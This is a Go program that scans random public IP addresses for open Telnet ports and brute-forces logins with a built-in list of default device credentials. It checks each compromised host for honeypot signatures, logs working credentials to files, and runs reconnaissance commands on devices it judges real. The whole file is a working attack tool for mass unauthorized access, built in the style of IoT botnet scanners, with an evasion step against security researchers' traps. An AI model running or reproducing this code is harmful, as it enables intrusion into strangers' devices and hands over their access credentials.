package main

import (
	"bufio"
	"fmt"
	"math/rand"
	"net"
	"os"
	"strings"
	"sync"
	"time"
)

const (
	MAX_GOROUTINES  = 500
	MAX_IPS         = 10000
	ATTEMPTS_PER_IP = 15
	TIMEOUT         = 3 * time.Second
)

var COMBOS = []string{
	"root:root", "admin:admin", "user:user", "test:test", "guest:guest",
	"admin:password", "root:password", "admin:123456", "root:123456",
	"user:123456", "admin:admin123", "root:admin", "administrator:",
	"support:support", "service:service", "ftp:ftp", "www:www",
	"oracle:oracle", "postgres:postgres", "mysql:mysql", "tomcat:tomcat",
	"cisco:cisco", "operator:operator", "backup:backup", "nagios:nagios",
	"pi:raspberry", "ubnt:ubnt", "mikrotik:admin", "zte:zte", "huawei:admin",
	"d-link:d-link", "netgear:password", "linksys:admin", "synology:admin",
	"qnap:admin", "root:toor", "root:default", "root:1234", "admin:1234",
}

var HONEYPOT_PAYLOAD = "uname -a; ls /; exit\n"
var REAL_PAYLOAD = "whoami; pwd; ps | head -5; exit\n"

type Stats struct {
	sync.RWMutex
	Success  int
	Fail     int
	Honeypot int
	Real     int
	IPs      int
}

var GLOBAL_STATS = &Stats{}
var IP_CHAN = make(chan string, 1000)

func main() {
	rand.Seed(time.Now().UnixNano())

	honeypotFile, _ := os.Create("honeypots.txt")
	realFile, _ := os.Create("real.txt")
	defer honeypotFile.Close()
	defer realFile.Close()

	go generateIPs()
	go printStats()

	var wg sync.WaitGroup
	sem := make(chan struct{}, MAX_GOROUTINES)

	for i := 0; i < MAX_GOROUTINES; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for ip := range IP_CHAN {
				sem <- struct{}{}
				testIP(ip, honeypotFile, realFile)
				<-sem
			}
		}()
	}

	time.Sleep(30 * time.Second)
	close(IP_CHAN)
	wg.Wait()
	printFinalStats()
}

func generateIPs() {
	for GLOBAL_STATS.IPs < MAX_IPS {
		ip := fmt.Sprintf("%d.%d.%d.%d",
			rand.Intn(223)+1,
			rand.Intn(256),
			rand.Intn(256),
			rand.Intn(254)+1)

		if !isPrivate(ip) {
			GLOBAL_STATS.Lock()
			GLOBAL_STATS.IPs++
			GLOBAL_STATS.Unlock()
			IP_CHAN <- ip
		}
	}
}

func isPrivate(ip string) bool {
	parts := strings.Split(ip, ".")
	if parts[0] == "10" {
		return true
	}
	if parts[0] == "172" {
		if b := atoi(parts[1]); b >= 16 && b <= 31 {
			return true
		}
	}
	if parts[0] == "192" && parts[1] == "168" {
		return true
	}
	if parts[0] == "127" {
		return true
	}
	if parts[0] == "169" && parts[1] == "254" {
		return true
	}
	return false
}

func atoi(s string) int {
	var n int
	for _, ch := range s {
		n = n*10 + int(ch-'0')
	}
	return n
}

func testIP(ip string, honeypotFile, realFile *os.File) {
	if !portOpen(ip, 23) {
		GLOBAL_STATS.Lock()
		GLOBAL_STATS.Fail++
		GLOBAL_STATS.Unlock()
		return
	}

	for i := 0; i < ATTEMPTS_PER_IP && i < len(COMBOS); i++ {
		combo := COMBOS[rand.Intn(len(COMBOS))]
		parts := strings.Split(combo, ":")
		user, pass := parts[0], parts[1]

		conn, err := net.DialTimeout("tcp", ip+":23", TIMEOUT)
		if err != nil {
			continue
		}

		if tryLogin(conn, user, pass) {
			GLOBAL_STATS.Lock()
			GLOBAL_STATS.Success++
			GLOBAL_STATS.Unlock()

			if isHoneypot(conn) {
				GLOBAL_STATS.Lock()
				GLOBAL_STATS.Honeypot++
				GLOBAL_STATS.Unlock()
				fmt.Printf("[!] Honeypot: %s@%s\n", user, ip)
				honeypotFile.WriteString(fmt.Sprintf("%s:%s @ %s\n", user, pass, ip))
			} else {
				GLOBAL_STATS.Lock()
				GLOBAL_STATS.Real++
				GLOBAL_STATS.Unlock()
				fmt.Printf("[+] Real: %s@%s\n", user, ip)
				realFile.WriteString(fmt.Sprintf("%s:%s @ %s\n", user, pass, ip))
				runPayload(conn, REAL_PAYLOAD)
			}
			conn.Close()
			return
		}
		conn.Close()
	}

	GLOBAL_STATS.Lock()
	GLOBAL_STATS.Fail++
	GLOBAL_STATS.Unlock()
}

func portOpen(ip string, port int) bool {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", ip, port), time.Second)
	if err != nil {
		return false
	}
	conn.Close()
	return true
}

func tryLogin(conn net.Conn, user, pass string) bool {
	conn.SetDeadline(time.Now().Add(TIMEOUT))
	reader := bufio.NewReader(conn)

	if !readUntil(reader, "login:", "username:", "user:") {
		return false
	}

	conn.Write([]byte(user + "\n"))
	time.Sleep(200 * time.Millisecond)

	if !readUntil(reader, "password:", "pass:") {
		return false
	}

	conn.Write([]byte(pass + "\n"))
	time.Sleep(500 * time.Millisecond)

	conn.Write([]byte("echo test\n"))

	start := time.Now()
	for time.Since(start) < time.Second {
		line, _ := reader.ReadString('\n')
		if strings.Contains(line, "test") {
			return true
		}
	}
	return false
}

func readUntil(reader *bufio.Reader, prompts ...string) bool {
	start := time.Now()
	for time.Since(start) < 2*time.Second {
		line, err := reader.ReadString('\n')
		if err != nil {
			continue
		}
		line = strings.ToLower(line)
		for _, prompt := range prompts {
			if strings.Contains(line, prompt) {
				return true
			}
		}
	}
	return false
}

func isHoneypot(conn net.Conn) bool {
	conn.SetDeadline(time.Now().Add(TIMEOUT))
	conn.Write([]byte(HONEYPOT_PAYLOAD))
	time.Sleep(time.Second)

	reader := bufio.NewReader(conn)
	response := ""
	start := time.Now()

	for time.Since(start) < 2*time.Second {
		line, err := reader.ReadString('\n')
		if err != nil {
			break
		}
		response += line
	}

	response = strings.ToLower(response)
	honeypotIndicators := []string{
		"honeyd", "kippo", "cowrie", "dionaea", "conpot",
		"2.6.32", "3.13.0", "4.4.0", "qemu", "vmware",
	}

	for _, indicator := range honeypotIndicators {
		if strings.Contains(response, indicator) {
			return true
		}
	}

	if strings.Count(response, "command not found") > 2 {
		return true
	}

	return false
}

func runPayload(conn net.Conn, payload string) {
	conn.SetDeadline(time.Now().Add(TIMEOUT))
	conn.Write([]byte(payload))
	time.Sleep(2 * time.Second)
}

func printStats() {
	for {
		time.Sleep(2 * time.Second)
		GLOBAL_STATS.RLock()
		fmt.Println("\n= Current Stats =")
		fmt.Printf("Successes => %d\n", GLOBAL_STATS.Success)
		fmt.Printf("Fails => %d\n", GLOBAL_STATS.Fail)
		fmt.Printf("Honeypots => %d\n", GLOBAL_STATS.Honeypot)
		fmt.Printf("Real Devices => %d\n", GLOBAL_STATS.Real)
		fmt.Printf("IPs Tested => %d\n", GLOBAL_STATS.IPs)
		fmt.Println("=================")
		GLOBAL_STATS.RUnlock()
	}
}

func printFinalStats() {
	GLOBAL_STATS.RLock()
	defer GLOBAL_STATS.RUnlock()

	fmt.Println("\n=== FINAL STATISTICS ===")
	fmt.Printf("Successes => %d\n", GLOBAL_STATS.Success)
	fmt.Printf("Fails => %d\n", GLOBAL_STATS.Fail)
	fmt.Printf("Honeypots => %d\n", GLOBAL_STATS.Honeypot)
	fmt.Printf("Real Devices => %d\n", GLOBAL_STATS.Real)
	fmt.Printf("Total IPs => %d\n", GLOBAL_STATS.IPs)

	if GLOBAL_STATS.Success > 0 {
		rate := float64(GLOBAL_STATS.Real) / float64(GLOBAL_STATS.Success) * 100
		fmt.Printf("Real Device Rate => %.1f%%\n", rate)
	}
	fmt.Println("========================")
}
